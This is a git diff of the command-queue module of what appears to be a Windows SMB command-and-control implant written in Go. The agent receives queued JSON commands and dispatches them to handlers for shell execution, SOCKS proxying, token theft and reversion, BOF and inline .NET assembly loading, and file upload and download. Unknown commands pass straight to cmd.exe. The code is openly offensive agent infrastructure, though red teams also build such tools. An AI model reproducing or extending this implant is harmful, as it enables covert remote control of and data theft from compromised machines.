@@ -1,4 +1,6 @@
-// server/docker/payloads/Windows/command_queue.go
+// server/docker/payloads/SMB_Windows/command_queue.go
+// Command queue for SMB agent - core infrastructure only, handlers in action_*.go files
+
 //go:build windows
 // +build windows
 
@@ -10,7 +12,6 @@ import (
 	"os"
 	"os/exec"
 	"runtime"
-	"strconv"
 	"strings"
 	"sync"
 	"time"
@@ -24,8 +25,8 @@ type CommandQueue struct {
 	cmdRegistry     map[string]CommandInterface
 	cmdContext      *CommandContext
 	activeDownloads map[string]*DownloadInfo
-	activeJobs      map[string]JobInfo
 	activeUploads   map[string]*UploadInfo
+	activeJobs      map[string]JobInfo
 }
 
 // NewCommandQueue creates a new command queue instance
@@ -36,46 +37,37 @@ func NewCommandQueue() *CommandQueue {
 	}
 
 	ctx := &CommandContext{
-		WorkingDir:  currentDir,
-		SudoSession: nil,                     // Initialize SudoSession as nil
-		SessionEnv:  make(map[string]string), // Initialize session environment map
-		TokenStore:  nil,                     // Will be initialized for Windows
-	}
-
-	// Initialize platform-specific features
-	if runtime.GOOS == "windows" {
-		// Initialize Windows token store
-		ctx.TokenStore = initializeWindowsTokenStore()
+		WorkingDir: currentDir,
+		SessionEnv: make(map[string]string),
 	}
 
 	queue := &CommandQueue{
-		commands:        make([]Command, 0, 10),                // Pre-allocate for typical queue depth
-		cmdRegistry:     make(map[string]CommandInterface, 32), // Pre-allocate for all commands
+		commands:        make([]Command, 0, 10),
+		cmdRegistry:     make(map[string]CommandInterface, 32),
 		cmdContext:      ctx,
-		activeDownloads: make(map[string]*DownloadInfo, 4),   // Pre-allocate for concurrent downloads
-		activeJobs:      make(map[string]JobInfo, 8),         // Pre-allocate for concurrent jobs
-		activeUploads:   make(map[string]*UploadInfo, 4),     // Pre-allocate for concurrent uploads
+		activeDownloads: make(map[string]*DownloadInfo, 4),
+		activeUploads:   make(map[string]*UploadInfo, 4),
+		activeJobs:      make(map[string]JobInfo, 8),
 	}
 
-	// Register all core commands
+	// Register all commands - these are defined in action_*.go files
 	queue.RegisterCommand(&CdCommand{})
 	queue.RegisterCommand(&LsCommand{})
 	queue.RegisterCommand(&PwdCommand{})
-	queue.RegisterCommand(&DownloadCommand{})
-	queue.RegisterCommand(&UploadCommand{})
+	queue.RegisterCommand(&CatCommand{})
 	queue.RegisterCommand(&ShellCommand{})
-	queue.RegisterCommand(&SocksCommand{})
-	queue.RegisterCommand(&JobKillCommand{})
+	queue.RegisterCommand(&WhoamiCommand{})
 	queue.RegisterCommand(&ExitCommand{})
 	queue.RegisterCommand(&SleepCommand{})
-	queue.RegisterCommand(&RekeyCommand{})
 	queue.RegisterCommand(&EnvCommand{})
-	queue.RegisterCommand(&CatCommand{})
-	queue.RegisterCommand(&HashCommand{})
-	queue.RegisterCommand(&HashDirCommand{})
 	queue.RegisterCommand(&PSCommand{})
 	queue.RegisterCommand(&RmCommand{})
-	queue.RegisterCommand(&WhoamiCommand{})
+	queue.RegisterCommand(&HashCommand{})
+	queue.RegisterCommand(&HashDirCommand{})
+	queue.RegisterCommand(&DownloadCommand{})
+	queue.RegisterCommand(&UploadCommand{})
+	queue.RegisterCommand(&SocksCommand{})
+	queue.RegisterCommand(&JobKillCommand{})
 	queue.RegisterCommand(&TokenCommand{})
 	queue.RegisterCommand(&Rev2SelfCommand{})
 	queue.RegisterCommand(&BOFCommand{})
@@ -91,12 +83,6 @@ func NewCommandQueue() *CommandQueue {
 	queue.RegisterCommand(&InlineAssemblyCommand{})
 	queue.RegisterCommand(&InlineAssemblyAsyncCommand{})
 
-	// Print all registered commands
-	fmt.Println()
-
-	// Start cleanup goroutine for stale transfers
-	go queue.cleanupStaleTransfers()
-
 	return queue
 }
 
@@ -105,10 +91,164 @@ func (cq *CommandQueue) RegisterCommand(cmd CommandInterface) {
 	cq.cmdRegistry[cmd.Name()] = cmd
 }
 
+// AddCommands parses and adds commands to the queue
+func (cq *CommandQueue) AddCommands(jsonData string) error {
+	var commands []Command
+	if err := json.Unmarshal([]byte(jsonData), &commands); err != nil {
+		return fmt.Errorf("failed to parse commands: %v", err)
+	}
+
+	cq.mu.Lock()
+	defer cq.mu.Unlock()
+
+	cq.commands = append(cq.commands, commands...)
+	return nil
+}
+
+// ProcessNextCommand processes the next command in the queue
+func (cq *CommandQueue) ProcessNextCommand() (*CommandResult, error) {
+	cq.mu.Lock()
+	if len(cq.commands) == 0 {
+		cq.mu.Unlock()
+		return nil, nil
+	}
+
+	cmd := cq.commands[0]
+	cq.commands = cq.commands[1:]
+	cq.mu.Unlock()
+
+	// Set the current command in context
+	cq.cmdContext.mu.Lock()
+	cq.cmdContext.CurrentCommand = &cmd
+	cq.cmdContext.mu.Unlock()
+
+	// Apply session environment variables
+	cq.applySessionEnvironment()
+
+	// Handle upload chunks
+	if cmd.Command == "upload" && cmd.Data != "" {
+		result, err := HandleUploadChunk(cmd, cq.cmdContext)
+		if err != nil {
+			return &CommandResult{
+				Command:     cmd,
+				Error:       err,
+				ErrorString: err.Error(),
+				ExitCode:    1,
+				CompletedAt: time.Now().Format(time.RFC3339),
+			}, nil
+		}
+		return result, nil
+	}
+
+	// Handle download continuation
+	if cmd.Filename != "" && cmd.CurrentChunk > 0 {
+		cq.mu.Lock()
+		downloadInfo, exists := cq.activeDownloads[cmd.Filename]
+		cq.mu.Unlock()
+
+		if !exists {
+			return &CommandResult{
+				Command:     cmd,
+				Error:       fmt.Errorf("no active download found for %s", cmd.Filename),
+				ErrorString: fmt.Sprintf("no active download found for %s", cmd.Filename),
+				ExitCode:    1,
+				CompletedAt: time.Now().Format(time.RFC3339),
+			}, nil
+		}
+
+		if !downloadInfo.InProgress {
+			return &CommandResult{
+				Command:     cmd,
+				Error:       fmt.Errorf("download for %s is no longer active", cmd.Filename),
+				ErrorString: fmt.Sprintf("download for %s is no longer active", cmd.Filename),
+				ExitCode:    1,
+				CompletedAt: time.Now().Format(time.RFC3339),
+			}, nil
+		}
+
+		result, err := GetNextFileChunk(downloadInfo.FilePath, cmd.CurrentChunk, cmd)
+		if err != nil {
+			return &CommandResult{
+				Command:     cmd,
+				Error:       err,
+				ErrorString: err.Error(),
+				ExitCode:    1,
+				CompletedAt: time.Now().Format(time.RFC3339),
+			}, nil
+		}
+
+		cq.UpdateDownloadProgress(cmd.Filename, cmd.CurrentChunk)
+		return result, nil
+	}
+
+	// Parse command
+	var args []string
+	cmdLower := strings.ToLower(strings.TrimSpace(cmd.Command))
+
+	if strings.HasPrefix(cmdLower, "download") {
+		args = parseDownloadCommand(cmd.Command)
+	} else if strings.HasPrefix(cmdLower, "upload") {
+		args = parseUploadCommand(cmd.Command)
+	} else {
+		args = parseCommandLine(cmd.Command)
+	}
+
+	if len(args) == 0 {
+		return &CommandResult{
+			Command:     cmd,
+			Error:       fmt.Errorf("empty command"),
+			ErrorString: "empty command",
+			ExitCode:    1,
+			CompletedAt: time.Now().Format(time.RFC3339),
+		}, nil
+	}
+
+	cmdType := args[0]
+	cmdArgs := args[1:]
+
+	// Look up command handler
+	if handler, exists := cq.cmdRegistry[cmdType]; exists {
+		result := handler.Execute(cq.cmdContext, cmdArgs)
+
+		// For file operations, preserve data from handler
+		if (cmdType == "download" || cmdType == "upload") &&
+			(result.Command.Filename != "" || result.Command.Data != "") {
+			result.Command.CommandID = cmd.CommandID
+			result.Command.CommandDBID = cmd.CommandDBID
+			result.Command.AgentID = cmd.AgentID
+			result.Command.Timestamp = cmd.Timestamp
+		} else {
+			result.Command = cmd
+		}
+
+		result.CompletedAt = time.Now().Format(time.RFC3339)
+		return &result, nil
+	}
+
+	// If no handler found, try to execute as shell command
+	output, err := executeShellCommand(cmd.Command)
+	if err != nil {
+		return &CommandResult{
+			Command:     cmd,
+			Output:      output,
+			Error:       err,
+			ErrorString: err.Error(),
+			ExitCode:    1,
+			CompletedAt: time.Now().Format(time.RFC3339),
+		}, nil
+	}
+
+	return &CommandResult{
+		Command:     cmd,
+		Output:      output,
+		ExitCode:    0,
+		CompletedAt: time.Now().Format(time.RFC3339),
+	}, nil
+}
+
 // Helper function to apply session environment before executing any command
 func (cq *CommandQueue) applySessionEnvironment() {
 	cq.cmdContext.mu.RLock()
-	// Quick check without iteration - most commands have no session env
 	if len(cq.cmdContext.SessionEnv) == 0 {
 		cq.cmdContext.mu.RUnlock()
 		return
@@ -120,118 +260,13 @@ func (cq *CommandQueue) applySessionEnvironment() {
 	}
 }
 
-// cleanupStaleTransfers periodically removes stale upload/download operations
-// Uses dynamic timeouts based on current sleep/jitter to account for mid-transfer changes
-func (cq *CommandQueue) cleanupStaleTransfers() {
-	ticker := time.NewTicker(5 * time.Minute)
-	defer ticker.Stop()
-
-	for range ticker.C {
-		now := time.Now()
-
-		// Calculate dynamic timeout based on current sleep/jitter values
-		// This handles cases where sleep is changed mid-transfer
-		uploadTimeout := calculateTransferTimeout(false)
-		downloadTimeout := calculateTransferTimeout(true)
-
-		cq.mu.Lock()
-
-		// Cleanup stale uploads with dynamic timeout
-		for filename, info := range cq.activeUploads {
-			if now.Sub(info.LastUpdate) > uploadTimeout {
-				// Free memory from stored chunks
-				info.Chunks = nil
-				delete(cq.activeUploads, filename)
-			}
-		}
-
-		// Cleanup stale downloads with dynamic timeout
-		for filename, info := range cq.activeDownloads {
-			if now.Sub(info.LastUpdate) > downloadTimeout {
-				delete(cq.activeDownloads, filename)
-			}
-		}
-
-		cq.mu.Unlock()
-	}
-}
-
-// calculateTransferTimeout computes appropriate timeout based on current sleep/jitter
-// Accounts for the fact that sleep can be changed mid-transfer via the sleep command
-func calculateTransferTimeout(isDownload bool) time.Duration {
-	// Parse current sleep value (global var, can change during runtime)
-	sleepSeconds := 60 // Default fallback
-	if parsedSleep, err := strconv.Atoi(sleep); err == nil && parsedSleep > 0 {
-		sleepSeconds = parsedSleep
-	}
-
-	// Parse current jitter value (global var, can change during runtime)
-	jitterPercent := 10 // Default fallback
-	if parsedJitter, err := strconv.Atoi(jitter); err == nil && parsedJitter >= 0 {
-		jitterPercent = parsedJitter
-	}
-
-	// Calculate max delay between chunks accounting for jitter
-	// Max delay = sleep * (1 + jitter/100)
-	maxDelay := float64(sleepSeconds) * (1.0 + float64(jitterPercent)/100.0)
-
-	// Safety multiplier: allow for 10 consecutive max-jitter polling cycles with no chunk
-	// This is conservative but prevents false positives from network issues/queuing
-	safetyMultiplier := 10.0
-	if isDownload {
-		// Downloads may need more time due to server-side processing
-		safetyMultiplier = 15.0
-	}
-
-	timeout := time.Duration(maxDelay*safetyMultiplier) * time.Second
-
-	// Enforce minimum timeout of 10 minutes to prevent premature cleanup
-	minTimeout := 10 * time.Minute
-	if timeout < minTimeout {
-		timeout = minTimeout
-	}
-
-	// Enforce maximum timeout of 2 hours to prevent unbounded memory retention
-	maxTimeout := 2 * time.Hour
-	if timeout > maxTimeout {
-		timeout = maxTimeout
-	}
-
-	return timeout
-}
-
-// AddCommands parses and adds commands to the queue
-func (cq *CommandQueue) AddCommands(jsonData string) error {
-	//fmt.Printf("DEBUG: AddCommands received JSON: %s\n", jsonData)
-
-	var commands []Command
-	if err := json.Unmarshal([]byte(jsonData), &commands); err != nil {
-		return fmt.Errorf("failed to parse commands: %v", err)
-	}
-
-	cq.mu.Lock()
-	defer cq.mu.Unlock()
-
-	cq.commands = append(cq.commands, commands...)
-	//fmt.Printf("Added %d commands to queue\n", len(commands))
-
-	/*
-		// Debug: print details of each command
-		for i, cmd := range commands {
-		}
-	*/
-	return nil
-}
-
 // executeShellCommand executes a command through the system shell
 func executeShellCommand(command string) (string, error) {
 	var cmd *exec.Cmd
 
 	if runtime.GOOS == "windows" {
-		// On Windows, use cmd.exe
 		cmd = exec.Command("cmd", "/c", command)
 	} else {
-		// On Unix-like systems, use sh
 		cmd = exec.Command("sh", "-c", command)
 	}
 
@@ -239,74 +274,32 @@ func executeShellCommand(command string) (string, error) {
 	return string(output), err
 }
 
-// executeExternalCommand handles execution of system commands
-func (cq *CommandQueue) executeExternalCommand(cmd Command, cmdType string, args []string) (*CommandResult, error) {
-	cmdPath, err := exec.LookPath(cmdType)
-	if err != nil {
-		return &CommandResult{
-			Command:     cmd,
-			Error:       fmt.Errorf("command not found: %v", err),
-			ErrorString: fmt.Sprintf("command not found: %v", err),
-			ExitCode:    127,
-		}, nil
-	}
-
-	execCmd := exec.Command(cmdPath, args...)
-	execCmd.Dir = cq.cmdContext.WorkingDir
-	output, err := execCmd.CombinedOutput()
-
-	result := &CommandResult{
-		Command: cmd,
-		Output:  string(output),
-	}
-
-	if err != nil {
-		result.Error = err
-		result.ErrorString = err.Error()
-		if exitErr, ok := err.(*exec.ExitError); ok {
-			result.ExitCode = exitErr.ExitCode()
-		} else {
-			result.ExitCode = 1
-		}
-	}
-
-	return result, nil
-}
-
 // parseCommandLine properly handles quoted arguments and spaces in paths
-// It supports both single and double quotes
 func parseCommandLine(cmdLine string) []string {
-	args := make([]string, 0, 8) // Pre-allocate for typical command with ~8 args
+	args := make([]string, 0, 8)
 	var current strings.Builder
-	current.Grow(64) // Pre-allocate builder buffer
+	current.Grow(64)
 	var inQuote rune
 	var escaped bool
 
-	// Iterate directly over string as runes (no intermediate allocation)
 	for _, r := range cmdLine {
-		// Handle escape sequences
 		if escaped {
 			current.WriteRune(r)
 			escaped = false
 			continue
 		}
 
-		// Check for escape character
 		if r == '\\' {
-			// Only escape quotes and backslashes within quotes
 			if inQuote != 0 {
 				escaped = true
 				continue
 			}
-			// Otherwise, treat as regular backslash (for Windows paths)
 			current.WriteRune(r)
 			continue
 		}
 
-		// Handle quotes
 		if inQuote != 0 {
 			if r == inQuote {
-				// End of quoted section
 				inQuote = 0
 			} else {
 				current.WriteRune(r)
@@ -314,13 +307,11 @@ func parseCommandLine(cmdLine string) []string {
 			continue
 		}
 
-		// Start of quoted section
 		if r == '"' || r == '\'' {
 			inQuote = r
 			continue
 		}
 
-		// Handle whitespace outside quotes
 		if unicode.IsSpace(r) {
 			if current.Len() > 0 {
 				args = append(args, current.String())
@@ -329,11 +320,9 @@ func parseCommandLine(cmdLine string) []string {
 			continue
 		}
 
-		// Regular character
 		current.WriteRune(r)
 	}
 
-	// Add any remaining content
 	if current.Len() > 0 {
 		args = append(args, current.String())
 	}
@@ -342,40 +331,29 @@ func parseCommandLine(cmdLine string) []string {
 }
 
 // parseDownloadCommand specifically handles the download command
-// The entire argument after "download" should be treated as a single file path
 func parseDownloadCommand(cmdLine string) []string {
-	// Remove any leading/trailing whitespace
 	cmdLine = strings.TrimSpace(cmdLine)
 
-	// Check if it starts with "download" (case-insensitive)
 	if !strings.HasPrefix(strings.ToLower(cmdLine), "download") {
-		// Not a download command, use regular parsing
 		return parseCommandLine(cmdLine)
 	}
 
-	// Check if there's anything after "download"
-	if len(cmdLine) <= 8 { // len("download") = 8
+	if len(cmdLine) <= 8 {
 		return []string{"download"}
 	}
 
-	// Make sure there's a space after "download"
 	if cmdLine[8] != ' ' && cmdLine[8] != '\t' {
-		// Not a properly formatted download command
 		return parseCommandLine(cmdLine)
 	}
 
-	// Get everything after "download " as the file path
 	remainder := strings.TrimSpace(cmdLine[8:])
 
 	if remainder == "" {
 		return []string{"download"}
 	}
 
-	// For download, treat everything after "download " as the file path
-	// But still respect quotes if they're used
 	if (strings.HasPrefix(remainder, "\"") && strings.HasSuffix(remainder, "\"")) ||
 		(strings.HasPrefix(remainder, "'") && strings.HasSuffix(remainder, "'")) {
-		// Remove surrounding quotes
 		remainder = remainder[1 : len(remainder)-1]
 	}
 
@@ -383,46 +361,33 @@ func parseDownloadCommand(cmdLine string) []string {
 }
 
 // parseUploadCommand specifically handles the upload command
-// Upload can have 1 or 2 arguments, but we need to handle spaces in paths
 func parseUploadCommand(cmdLine string) []string {
-	// Remove any leading/trailing whitespace
 	cmdLine = strings.TrimSpace(cmdLine)
 
-	// Check if it starts with "upload" (case-insensitive)
 	if !strings.HasPrefix(strings.ToLower(cmdLine), "upload") {
-		// Not an upload command, use regular parsing
 		return parseCommandLine(cmdLine)
 	}
 
-	// Check if there's anything after "upload"
-	if len(cmdLine) <= 6 { // len("upload") = 6
+	if len(cmdLine) <= 6 {
 		return []string{"upload"}
 	}
 
-	// Make sure there's a space after "upload"
 	if cmdLine[6] != ' ' && cmdLine[6] != '\t' {
-		// Not a properly formatted upload command
 		return parseCommandLine(cmdLine)
 	}
 
-	// Get everything after "upload "
 	remainder := strings.TrimSpace(cmdLine[6:])
 
 	if remainder == "" {
 		return []string{"upload"}
 	}
 
-	// For upload, we need to handle potential spaces in the path
-	// Upload typically just has one argument (the remote path)
-	// The client handles the local file selection
-
-	// Check if the path is quoted
 	if (strings.HasPrefix(remainder, "\"") && strings.HasSuffix(remainder, "\"")) ||
 		(strings.HasPrefix(remainder, "'") && strings.HasSuffix(remainder, "'")) {
-		// Remove surrounding quotes
 		remainder = remainder[1 : len(remainder)-1]
 	}
 
-	// Return upload command with the full path as a single argument
 	return []string{"upload", remainder}
 }
+
+// Download/Upload tracking methods are in job_manager.go
